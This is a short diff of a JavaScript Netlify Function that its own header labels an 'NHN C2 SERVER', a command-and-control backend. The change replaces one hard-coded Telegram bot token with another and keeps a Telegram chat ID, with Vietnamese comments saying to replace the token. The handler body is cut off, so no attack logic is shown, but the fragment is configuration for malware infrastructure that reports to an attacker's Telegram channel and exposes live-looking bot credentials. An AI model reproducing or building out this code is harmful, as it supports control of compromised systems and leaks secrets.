@@ -2,7 +2,7 @@
 // 🔥 NHN C2 SERVER - Netlify Function
 // ============================================================
 
-const TELEGRAM_BOT = '8694531485:AAGEFpgDhRNnpHGrnzceC9Qp5r9ldto3Nt8'; // Thay token
+const TELEGRAM_BOT = '8850216835:AAEW5ECVAt52m-omYejMu5xNQwLm5By70SE'; // Thay token
 const TELEGRAM_CHAT = '8594169530';   // Thay chat ID
 
 exports.handler = async (event) => {
